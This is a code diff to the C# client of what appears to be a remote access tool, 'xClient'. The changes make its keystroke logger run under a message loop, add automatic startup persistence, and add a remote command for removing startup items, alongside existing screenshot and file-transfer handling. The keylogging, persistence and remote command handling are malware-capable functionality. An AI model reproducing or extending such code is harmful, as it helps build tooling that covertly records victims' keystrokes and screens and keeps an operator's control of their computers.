@@ -17,6 +17,7 @@ namespace xClient
         private static bool _reconnect = true;
         private static volatile bool _connected = false;
         private static Mutex _appMutex;
+        private static ApplicationContext _msgLoop;
 
         [STAThread]
         private static void Main(string[] args)
@@ -38,7 +39,9 @@ namespace xClient
             if (CommandHandler.LastDesktopScreenshot != null)
                 CommandHandler.LastDesktopScreenshot.Dispose();
             if (Logger.Instance != null)
-                Logger.Instance.Enabled = false;
+                Logger.Instance.Dispose();
+            if (_msgLoop != null)
+                _msgLoop.ExitThread();
             if (_appMutex != null)
                 _appMutex.Close();
 
@@ -76,6 +79,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.Action),
                 typeof (Core.Packets.ServerPackets.GetStartupItems),
                 typeof (Core.Packets.ServerPackets.AddStartupItem),
+                typeof (Core.Packets.ServerPackets.RemoveStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                 typeof (Core.Packets.ServerPackets.GetLogs),
                 typeof (Core.Packets.ClientPackets.Initialize),
@@ -130,14 +134,21 @@ namespace xClient
 
                 new Thread(SystemCore.UserIdleThread).Start();
 
+                if (Settings.STARTUP)
+                {
+                    SystemCore.AddToStartup();
+                }
+
                 InitializeClient();
 
                 if (Settings.ENABLELOGGER)
                 {
                     new Thread(() =>
                     {
-                        Logger logger = new Logger(15000) { Enabled = true };
-                    }).Start();
+                        _msgLoop = new ApplicationContext();
+                        Logger logger = new Logger(15000);
+                        Application.Run(_msgLoop);
+                    }).Start(); ;
                 }
             }
             else
@@ -318,6 +329,10 @@ namespace xClient
             else if (type == typeof (Core.Packets.ServerPackets.AddStartupItem))
             {
                 CommandHandler.HandleAddStartupItem((Core.Packets.ServerPackets.AddStartupItem) packet, client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.RemoveStartupItem))
+            {
+                CommandHandler.HandleAddRemoveStartupItem((Core.Packets.ServerPackets.RemoveStartupItem) packet, client);
             }
             else if (type == typeof (Core.Packets.ServerPackets.DownloadFileCanceled))
             {
